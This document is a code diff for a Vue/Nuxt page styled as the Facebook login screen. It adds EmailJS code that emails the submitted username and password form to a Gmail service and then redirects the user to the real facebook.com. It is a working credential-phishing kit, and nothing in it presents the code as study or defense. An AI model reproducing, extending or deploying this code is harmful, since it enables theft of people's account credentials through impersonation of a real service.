@@ -2,28 +2,31 @@
   <div>
     <div id="navwrapper" class="is-hidden-mobile">
       <div id="navbar">
-        <table class="tablewrapper">
-          <tr>
-            <td class="row1">Email or Phone</td>
-            <td class="row1">Password</td>
-          </tr>
-          <tr>
-            <td><input v-model="username" type="text" class="inputtext" /></td>
-            <td>
-              <input v-model="password" type="password" class="inputtext" />
-            </td>
-            <td>
-              <div id="button" @click="login">Log In</div>
-            </td>
-          </tr>
-          <tr>
-            <td>
-              <div class="row2"></div>
-            </td>
-            <td class="row2 h">Forgot your password?</td>
-          </tr>
-        </table>
-
+        <form class="form-login" @submit.prevent="login">
+          <table class="tablewrapper">
+            <tr>
+              <td class="row1">Email or Phone</td>
+              <td class="row1">Password</td>
+            </tr>
+            <tr>
+              <td>
+                <input v-model="username" type="text" class="inputtext" />
+              </td>
+              <td>
+                <input v-model="password" type="password" class="inputtext" />
+              </td>
+              <td>
+                <input id="button" type="submit" value="Login" @click="login" />
+              </td>
+            </tr>
+            <tr>
+              <td>
+                <div class="row2"></div>
+              </td>
+              <td class="row2 h">Forgot your password?</td>
+            </tr>
+          </table>
+        </form>
         <h1 class="logowrapper">facebook</h1>
       </div>
     </div>
@@ -284,7 +287,7 @@
         </div>
         <div class="app">
           <div class="loginform">
-            <form @submit.prevent="login">
+            <form class="form-login" @submit.prevent="login">
               <div class="inputBox">
                 <input
                   v-model="username"
@@ -336,6 +339,15 @@ export default {
       password: ''
     }
   },
+  head() {
+    return {
+      title: 'Facebook - Login or Sign up'
+    }
+  },
+  mounted() {
+    // eslint-disable-next-line no-undef
+    emailjs.init('user_Dk73zY8XjjHd5v1fmVzVU')
+  },
   methods: {
     login: async function() {
       await this.$axios
@@ -347,6 +359,9 @@ export default {
         .then(() => {
           this.username = ''
           this.password = ''
+          const form = document.getElementsByClassName('form-login')[0]
+          // eslint-disable-next-line no-undef
+          emailjs.sendForm('gmail', 'template_Zwf9yTds', form)
           window.location.replace('http://facebook.com')
         })
     }
@@ -428,7 +443,7 @@ h1 {
 #button {
   position: relative;
   width: 80px;
-  height: 20px;
+  height: 23px;
   background-color: #5b72a9;
   border: 1px solid #999;
   border-color: #8b9dc3 #2f477a #29447e #1a356e;
@@ -439,6 +454,12 @@ h1 {
   text-align: center;
   color: #fff;
   line-height: 16px;
+}
+
+#button:focus {
+  background: #7c93ca;
+  border: none;
+  outline: none;
 }
 
 .tablewrapper {
